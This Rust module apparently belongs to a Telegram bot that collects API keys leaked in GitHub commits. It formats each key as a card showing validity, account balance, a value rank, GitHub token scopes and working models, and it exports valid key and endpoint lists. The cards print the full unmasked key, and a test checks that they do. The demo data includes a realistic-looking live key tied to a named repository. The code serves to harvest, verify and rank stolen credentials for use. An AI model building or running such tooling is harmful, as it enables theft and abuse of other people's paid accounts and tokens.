use crate::extract::host_of;
use crate::probe::is_non_chat_model;
use crate::store::{Finding, ProbeLine};
use chrono::{FixedOffset, TimeZone, Utc};

pub fn esc(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
}

pub fn host_label(endpoint: &str) -> String {
    host_of(endpoint)
}

pub fn msk(ts: i64) -> String {
    let tz = FixedOffset::east_opt(3 * 3600).unwrap();
    match Utc.timestamp_opt(ts, 0).single() {
        Some(dt) => dt.with_timezone(&tz).format("%d.%m %H:%M").to_string(),
        None => "—".into(),
    }
}

fn short_model(m: &str) -> &str {
    m.rsplit('/').next().unwrap_or(m)
}

fn secs(ms: u64) -> String {
    format!("{:.1}", ms as f64 / 1000.0)
}

/// The balance column is user-facing. A buggy relay can return an id or a
/// timestamp in a money-shaped field; never print that as dollars.
fn sane_balance(value: &str) -> bool {
    let cleaned: String = value
        .chars()
        .filter(|c| c.is_ascii_digit() || *c == '.' || *c == '-')
        .collect();
    match cleaned.parse::<f64>() {
        Ok(n) => n.is_finite() && n.abs() <= 1_000_000_000.0,
        // Only the explicit unknown marker is displayable; arbitrary text
        // in a money field is not a balance.
        Err(_) => value.trim() == "?" || value.trim().is_empty(),
    }
}

pub fn valid_txt(rows: &[(String, String)]) -> String {
    let mut out = String::new();
    for (key, endpoint) in rows {
        out.push_str(key);
        out.push('\n');
        out.push_str(endpoint);
        out.push_str("\n\n");
    }
    out
}

fn provider_label(host: &str) -> &'static str {
    let h = host.to_ascii_lowercase();
    if h.contains("openai.com") {
        "OPENAI"
    } else if h.contains("deepseek.com") {
        "DEEPSEEK"
    } else if h.contains("openrouter.ai") {
        "OPENROUTER"
    } else if h.contains("moonshot") {
        "MOONSHOT"
    } else if h.contains("anthropic.com") {
        "ANTHROPIC"
    } else if h.contains("api.x.ai") || h == "x.ai" {
        "XAI"
    } else if h.contains("dashscope") || h.contains("aliyuncs.com") {
        "DASHSCOPE"
    } else if h.contains("modelscope.cn") {
        "MODELSCOPE"
    } else if h.contains("fish.audio") {
        "FISH AUDIO"
    } else if h.contains("elevenlabs.io") {
        "ELEVENLABS"
    } else if h.contains("seedance") || h.contains("volces.com") {
        "SEEDANCE"
    } else if h.contains("github.com") {
        "GITHUB PAT"
    } else {
        "CHAT API"
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum SpecialKind {
    Tts,
    Type,
    Seedance,
}

pub fn card(f: &Finding) -> String {
    let host = host_label(&f.endpoint);
    let is_pat = f.key_kind.eq_ignore_ascii_case("github_pat");
    let icon = match f.status.as_str() {
        "VALID" => "✅",
        "FAKE" => "🎭",
        "LIMIT" => "⏱️",
        "INVALID" => "❌",
        "PARTIAL" => "⚠️",
        "UNREACHABLE" => "🌐",
        _ => "•",
    };
    let status = f.status.as_str();
    let kind = if is_pat {
        "GitHub PAT"
    } else {
        provider_label(&host)
    };
    let pair_mark = if f.pair { "PAIR" } else { "CODE" };
    let special_model = f.models.iter().find_map(|m| {
        if m.starts_with("tts/") {
            Some((SpecialKind::Tts, short_model(m).to_string()))
        } else if m.starts_with("type/") {
            Some((SpecialKind::Type, short_model(m).to_string()))
        } else if m.starts_with("video/") {
            Some((SpecialKind::Seedance, short_model(m).to_string()))
        } else {
            None
        }
    });
    let mut out = String::new();

    out.push_str(&format!("🔑 <b>{kind}</b>\n"));
    out.push_str(&format!(
        "{icon} <b>{}</b> · <code>{}</code>\n\n",
        esc(status),
        esc(&host)
    ));
    out.push_str(&format!("<code>{}</code>\n\n", esc(&f.key)));

    out.push_str("🌐 <b>Эндпоинт</b>\n");
    out.push_str(&format!("<code>{}</code>\n\n", esc(&f.endpoint)));
    if let Some((kind, model)) = &special_model {
        let label = match kind {
            SpecialKind::Tts => "TTS",
            SpecialKind::Type => "TYPE",
            SpecialKind::Seedance => "SEEDANCE",
        };
        out.push_str(&format!("✅ <b>{}</b> · <b>{}</b>\n\n", label, esc(model)));
    }

    if is_pat {
        if !f.balance.trim().is_empty() {
            out.push_str(&format!("🔐 <b>Scopes</b> · {}\n", esc(&f.balance)));
        }
    } else {
        let balance = if f.balance.trim().is_empty() || !sane_balance(&f.balance) {
            "?".to_string()
        } else {
            f.balance.clone()
        };
        out.push_str(&format!("💰 <b>Баланс</b> · <b>{}</b>\n", esc(&balance)));
    }
    if !is_pat && !f.rank.trim().is_empty() {
        out.push_str(&format!(
            "🏆 <b>Ранг</b> · <b>{}</b> · {}/100\n",
            esc(f.rank.trim()),
            f.rank_score.clamp(0, 100)
        ));
    }
    let rpm = if f.rpm.trim().is_empty() {
        "?".to_string()
    } else {
        f.rpm.clone()
    };
    out.push_str(&format!("⚡ <b>RPM</b> · {}\n", esc(&rpm)));
    out.push_str(&format!(
        "🧠 <b>Каталог</b> · {} моделей\n",
        f.total_models.max(f.models.len() as i64)
    ));
    out.push_str(&format!(
        "🎯 <b>Проверено</b> · {} · <b>{}</b>\n",
        f.tested,
        if let Some((kind, _)) = &special_model {
            match kind {
                SpecialKind::Tts => "TTS OK",
                SpecialKind::Type => "TYPE OK",
                SpecialKind::Seedance => "SEEDANCE OK",
            }
        } else if f.chat_ok {
            "chat OK"
        } else {
            "chat fail"
        }
    ));
    out.push_str(&format!(
        "📅 <b>Проверка</b> · {} МСК\n\n",
        msk(f.last_checked)
    ));

    let working = if special_model.is_some() {
        f.probes
            .iter()
            .filter(|p| p.code == 200 && !p.note.contains("delete HTTP"))
            .count()
    } else {
        f.probes
            .iter()
            .filter(|p| p.code == 200 && p.note.is_empty() && !is_non_chat_model(&p.model))
            .count()
    };
    out.push_str(&format!("✅ <b>Работают</b> · <b>{}</b>\n", working));
    let mut shown = 0usize;
    for p in f.probes.iter().filter(|p| {
        p.code == 200
            && (p.note.is_empty()
                || p.note == "seedance ok"
                || p.note.starts_with("tts ok")
                || p.note.starts_with("type "))
    }) {
        if shown >= 12 {
            break;
        }
        out.push_str(&format!(
            "• <code>{}</code> · {}с\n",
            esc(short_model(&p.model)),
            secs(p.latency_ms)
        ));
        shown += 1;
    }
    if working == 0 {
        out.push_str("• —\n");
    } else if working > shown {
        out.push_str(&format!("… ещё {}\n", working - shown));
    }
    out.push('\n');

    if !f.probes.is_empty() {
        out.push_str("🔬 <b>Пробы</b>\n");
        let mut lines = 0usize;
        for p in f.probes.iter().take(12) {
            if lines >= 10 {
                break;
            }
            out.push_str(&probe_line(p));
            out.push('\n');
            lines += 1;
        }
        if f.probes.len() > lines {
            out.push_str(&format!("… ещё {}\n", f.probes.len() - lines));
        }
        out.push('\n');
    }

    if !f.models.is_empty() {
        out.push_str("📦 <b>Каталог моделей</b>\n");
        let mut line = String::new();
        let mut count = 0usize;
        for m in &f.models {
            let piece = if line.is_empty() {
                esc(short_model(m))
            } else {
                format!(", {}", esc(short_model(m)))
            };
            if line.chars().count() + piece.chars().count() > 900 || count >= 14 {
                break;
            }
            line.push_str(&piece);
            count += 1;
        }
        out.push_str(&line);
        if f.models.len() > count {
            out.push_str(&format!(" … +{}", f.models.len() - count));
        }
        out.push_str("\n\n");
    }

    out.push_str(&format!(
        "🏷 <b>{}</b> · {} · {} проб\n",
        kind, pair_mark, f.tested
    ));
    if f.status == "FAKE" {
        out.push_str("🎭 ответ не прошёл challenge");
    } else if f.status == "VALID" {
        out.push_str("✅ ключ принят");
    } else if f.status == "LIMIT" {
        out.push_str("⏱️ рейт-лимит");
    } else if f.status == "INVALID" {
        out.push_str("❌ ключ не принят");
    } else {
        out.push_str("⚠️ нет подтверждения");
    }

    let limit = 3800usize;
    if out.chars().count() > limit {
        let cut: String = out.chars().take(limit - 2).collect();
        // Cut on a line boundary so an HTML tag/entity cannot be split and
        // rejected by Telegram's parser. Cards are line-oriented; the only
        // long line is the model list, already capped above.
        let cut = match cut.rfind('\n') {
            Some(i) if i > 0 => cut[..i].to_string(),
            _ => {
                let mut c = cut;
                if let Some(i) = c.rfind('<') {
                    if !c[i..].contains('>') {
                        c.truncate(i);
                    }
                }
                if let Some(i) = c.rfind('&') {
                    if !c[i..].contains(';') {
                        c.truncate(i);
                    }
                }
                c
            }
        };
        out = format!("{}…", cut);
    }
    out
}

fn probe_line(p: &ProbeLine) -> String {
    let name = esc(short_model(&p.model));
    match p.code {
        200 if p.note.is_empty() => {
            format!("✅ <code>{}</code> · 200 · {}с", name, secs(p.latency_ms))
        }
        200 if p.note.starts_with("фейк") => {
            format!("🎭 <code>{}</code> · 200 · фейк", name)
        }
        429 => format!("⏱️ <code>{}</code> · 429", name),
        401 => format!("❌ <code>{}</code> · 401", name),
        403 => format!("❌ <code>{}</code> · 403", name),
        404 => format!("⚠️ <code>{}</code> · 404", name),
        0 => format!("🌐 <code>{}</code> · timeout", name),
        c => format!("⚠️ <code>{}</code> · {} · {}", name, c, esc(&p.note)),
    }
}

pub fn demo_finding() -> Finding {
    let mut models: Vec<String> = vec![
        "aion-labs/aion-2.0".into(),
        "aion-labs/aion-3.0".into(),
        "aion-labs/aion-3.0-mini".into(),
        "aion-labs/aion-3.5".into(),
        "aion-labs/aion-3.5-mini".into(),
        "aion-labs/aion-rp-llama-3.1-8b".into(),
        "amazon/nova-2-lite-v1".into(),
        "amazon/nova-lite-v1".into(),
        "amazon/nova-micro-v1".into(),
        "amazon/nova-premier-v1".into(),
        "amazon/nova-pro-v1".into(),
        "anthropic/claude-3-haiku".into(),
        "anthropic/claude-3.5-haiku".into(),
        "anthropic/claude-fable-5".into(),
        "anthropic/claude-fable-5.1".into(),
        "anthropic/claude-haiku-4.5".into(),
        "anthropic/claude-haiku-5.5".into(),
        "anthropic/claude-opus-4".into(),
        "anthropic/claude-opus-4.1".into(),
        "anthropic/claude-opus-4.5".into(),
        "anthropic/claude-opus-4.6".into(),
        "anthropic/claude-opus-4.7".into(),
        "anthropic/claude-opus-4.8".into(),
        "anthropic/claude-opus-5".into(),
        "anthropic/claude-opus-5.5".into(),
        "anthropic/claude-sonnet-4".into(),
        "anthropic/claude-sonnet-4.5".into(),
        "anthropic/claude-sonnet-4.6".into(),
        "anthropic/claude-sonnet-5".into(),
        "anthropic/claude-sonnet-5.5".into(),
        "arcee-ai/trinity-large-thinking".into(),
        "baai/bge-base-en-v1.5".into(),
        "baai/bge-large-en-v1.5".into(),
        "baai/bge-m3".into(),
        "baidu/ernie-4.5-vl-424b-a47b".into(),
        "black-forest-labs/flux-1-dev".into(),
        "black-forest-labs/flux-1-redux-dev".into(),
        "black-forest-labs/flux-1-schnell".into(),
        "black-forest-labs/flux-1.1-pro".into(),
        "black-forest-labs/flux-2-dev".into(),
        "black-forest-labs/flux-2-klein-4b".into(),
    ];
    for i in 0..389 {
        models.push(format!("vendor{}/model-{}", i % 17, i));
    }

    let probes = vec![
        ProbeLine {
            model: "anthropic/claude-haiku-5.5".into(),
            code: 200,
            latency_ms: 1100,
            note: String::new(),
            rpm: String::new(),
        },
        ProbeLine {
            model: "anthropic/claude-opus-5.5".into(),
            code: 200,
            latency_ms: 900,
            note: String::new(),
            rpm: String::new(),
        },
        ProbeLine {
            model: "anthropic/claude-sonnet-5.5".into(),
            code: 200,
            latency_ms: 900,
            note: String::new(),
            rpm: String::new(),
        },
        ProbeLine {
            model: "openai/gpt-5.6-terra".into(),
            code: 200,
            latency_ms: 1800,
            note: String::new(),
            rpm: String::new(),
        },
        ProbeLine {
            model: "openai/gpt-6.1-sol".into(),
            code: 200,
            latency_ms: 1700,
            note: String::new(),
            rpm: String::new(),
        },
        ProbeLine {
            model: "aion-labs/aion-2.0".into(),
            code: 429,
            latency_ms: 140,
            note: "рейт-окно".into(),
            rpm: String::new(),
        },
        ProbeLine {
            model: "google/gemini-2.5-pro".into(),
            code: 429,
            latency_ms: 130,
            note: "рейт-окно".into(),
            rpm: String::new(),
        },
        ProbeLine {
            model: "google/gemini-3.8-flash".into(),
            code: 429,
            latency_ms: 120,
            note: "рейт-окно".into(),
            rpm: String::new(),
        },
        ProbeLine {
            model: "google/gemini-4-argon".into(),
            code: 429,
            latency_ms: 150,
            note: "рейт-окно".into(),
            rpm: String::new(),
        },
        ProbeLine {
            model: "openai/gpt-5.2".into(),
            code: 429,
            latency_ms: 110,
            note: "рейт-окно".into(),
            rpm: String::new(),
        },
        ProbeLine {
            model: "openai/gpt-5.5".into(),
            code: 429,
            latency_ms: 125,
            note: "рейт-окно".into(),
            rpm: String::new(),
        },
        ProbeLine {
            model: "openai/gpt-5.6-luna".into(),
            code: 429,
            latency_ms: 135,
            note: "рейт-окно".into(),
            rpm: String::new(),
        },
        ProbeLine {
            model: "openai/gpt-5.6-sol".into(),
            code: 429,
            latency_ms: 128,
            note: "рейт-окно".into(),
            rpm: String::new(),
        },
        ProbeLine {
            model: "openai/gpt-6-astra".into(),
            code: 429,
            latency_ms: 118,
            note: "рейт-окно".into(),
            rpm: String::new(),
        },
        ProbeLine {
            model: "openai/gpt-6-luna".into(),
            code: 429,
            latency_ms: 142,
            note: "рейт-окно".into(),
            rpm: String::new(),
        },
        ProbeLine {
            model: "openai/gpt-6-sol".into(),
            code: 429,
            latency_ms: 133,
            note: "рейт-окно".into(),
            rpm: String::new(),
        },
        ProbeLine {
            model: "qwen/qwen3.8-max-prime".into(),
            code: 429,
            latency_ms: 121,
            note: "рейт-окно".into(),
            rpm: String::new(),
        },
    ];

    Finding {
        id: 1,
        endpoint: "https://api.aicredits.in/v1".into(),
        key: "sk-live-cb5d8ff6563ab452b8dca1ce5f38cdb4827ff06f7a455190280f3f3713e5e5a8".into(),
        key_kind: "openai".into(),
        repo: "anshjotsinghgit1-boop/ai".into(),
        path: String::new(),
        commit_sha: String::new(),
        source: "commit".into(),
        status: "VALID".into(),
        pair: true,
        total_models: 430,
        tested: 26,
        chat_ok: true,
        models,
        probes,
        latency_ms: 4200,
        first_seen: Utc::now().timestamp() - 3600,
        last_checked: Utc::now().timestamp(),
        card_sent: true,
        balance: "$12.34".into(),
        rpm: "500/мин".into(),
        rank: "S".into(),
        rank_score: 92,
        rank_verdict: "valid".into(),
        rank_note: "5 working models; strong balance".into(),
        ranked_at: Utc::now().timestamp(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn valid_export_shape() {
        let rows = vec![
            ("sk-a".to_string(), "https://api.one.test/v1".to_string()),
            ("sk-b".to_string(), "https://api.two.test/v1".to_string()),
        ];
        assert_eq!(
            valid_txt(&rows),
            "sk-a\nhttps://api.one.test/v1\n\nsk-b\nhttps://api.two.test/v1\n\n"
        );
    }

    #[test]
    fn demo_card_matches_shape() {
        let f = demo_finding();
        let c = card(&f);
        assert!(c.contains("🔑 <b>CHAT API</b>"));
        assert!(c.contains("✅ <b>VALID</b> · <code>api.aicredits.in</code>"));
        assert!(c.contains("🌐 <b>Эндпоинт</b>"));
        assert!(c.contains("💰 <b>Баланс</b> · <b>$12.34</b>"));
        assert!(c.contains("🏆 <b>Ранг</b> · <b>S</b> · 92/100"));
        assert!(c.contains("⚡ <b>RPM</b> · 500/мин"));
        assert!(c.contains("🧠 <b>Каталог</b> · 430"));
        assert!(c.contains("✅ <b>Работают</b> · <b>5</b>"));
        assert!(c.contains("🏷 <b>CHAT API</b> · PAIR"));
        assert!(!c.contains("pair:"));
        assert!(!c.contains("anshjotsinghgit1-boop"));
        assert!(!c.contains("sk-liv...e5a8"));
        assert!(c.contains(&f.key));
        assert!(c.chars().count() <= 4000);

        let mut unknown = demo_finding();
        unknown.balance.clear();
        assert!(card(&unknown).contains("💰 <b>Баланс</b> · <b>?</b>"));
        let mut bogus = f.clone();
        bogus.balance = "2026102622361475021131657248768.00".into();
        assert!(card(&bogus).contains("💰 <b>Баланс</b> · <b>?</b>"));
        let mut text_balance = f.clone();
        text_balance.balance = "not-a-number".into();
        assert!(card(&text_balance).contains("💰 <b>Баланс</b> · <b>?</b>"));
    }

    #[test]
    fn tts_card_shows_tts_status() {
        let mut f = demo_finding();
        f.endpoint = "https://api.fish.audio/v1".into();
        f.key_kind = "fish_audio".into();
        f.models = vec!["tts/fish/s2.1-pro-free".into()];
        f.probes = vec![ProbeLine {
            model: "tts/fish/s2.1-pro-free".into(),
            code: 200,
            latency_ms: 700,
            note: "tts ok".into(),
            rpm: String::new(),
        }];
        f.chat_ok = false;
        let c = card(&f);
        assert!(c.contains("FISH AUDIO"));
        assert!(c.contains("✅ <b>TTS</b>"));
        assert!(c.contains("TTS OK"));
        assert!(!c.contains("chat fail"));
    }

    #[test]
    fn seedance_card_is_not_labelled_chat() {
        let mut f = demo_finding();
        f.endpoint = "https://ark.cn-beijing.volces.com/api/v3".into();
        f.key_kind = "seedance".into();
        f.models = vec!["video/seedance/doubao-seedance-2-5-260628".into()];
        f.probes = vec![ProbeLine {
            model: "video/seedance/doubao-seedance-2-5-260628".into(),
            code: 200,
            latency_ms: 300,
            note: "seedance ok".into(),
            rpm: String::new(),
        }];
        f.chat_ok = false;
        let c = card(&f);
        assert!(c.contains("SEEDANCE"));
        assert!(c.contains("SEEDANCE OK"));
        assert!(c.contains("doubao-seedance-2-5-260628"));
        assert!(!c.contains("chat fail"));
    }

    #[test]
    fn non_chat_type_card_is_not_labelled_chat() {
        let mut f = demo_finding();
        f.endpoint = "https://api.example.test/v1".into();
        f.models = vec!["type/embed/text-embedding-3-small".into()];
        f.probes = vec![ProbeLine {
            model: "type/embed/text-embedding-3-small".into(),
            code: 200,
            latency_ms: 120,
            note: "type embed ok".into(),
            rpm: String::new(),
        }];
        f.chat_ok = false;
        let c = card(&f);
        assert!(c.contains("✅ <b>TYPE</b>"));
        assert!(c.contains("TYPE OK"));
        assert!(!c.contains("chat fail"));
    }

    #[test]
    fn escapes_html() {
        assert_eq!(esc("a<b&c>d"), "a&lt;b&amp;c&gt;d");
    }
}
